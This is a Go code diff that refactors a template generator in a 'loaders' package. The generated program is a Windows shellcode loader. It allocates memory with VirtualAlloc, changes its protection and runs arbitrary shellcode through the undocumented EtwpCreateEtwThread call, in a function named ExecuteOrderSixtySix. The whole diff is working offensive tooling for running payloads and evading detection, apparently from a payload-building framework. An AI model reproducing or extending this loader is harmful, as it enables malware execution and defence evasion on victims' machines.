@@ -2,20 +2,22 @@ package loaders
 
 import (
 	"fmt"
+	"strings"
 )
 
-func GetEtwpCreateEtwThreadTemplate(targetProcess string) string {
-	InformProcessUnused(targetProcess)
+type ETWPTemplate struct{}
 
+func (t ETWPTemplate) Import() string {
 	return fmt.Sprintf(`
-package main
-
 import (
     "syscall"
     "unsafe"
 )
+`)
+}
 
-
+func (t ETWPTemplate) Const() string {
+	return fmt.Sprintf(`
 const (
     MEM_COMMIT                = 0x1000
     MEM_RESERVE               = 0x2000
@@ -37,10 +39,16 @@ var (
 	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
     WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
 )
+`)
+}
 
+func (t ETWPTemplate) Init() string {
+	return ""
+}
 
-func ExecuteOrderSixtySix(shellcode []byte) {
-    /* allocating the appropriate amount of memory */
+func (t ETWPTemplate) Process() string {
+	return fmt.Sprintf(`
+/* allocating the appropriate amount of memory */
     baseAddr, _, err := VirtualAlloc.Call(
         0,
         uintptr(len(shellcode)),
@@ -68,6 +76,30 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 
     threadId, _, err := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
     WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
-}
 `)
+}
+
+func (t ETWPTemplate) GetTemplate(targetProcess string) string {
+	InformProcessUnused(targetProcess)
+
+	var template = `
+package main
+
+__IMPORT__STATEMENT__
+
+__CONST__STATEMENT__
+
+func ExecuteOrderSixtySix(shellcode []byte) {
+
+__IMPORT__PROCESS__
+
+}
+`
+	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
+	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
+	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
+	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)
+
+	return template
+
 }
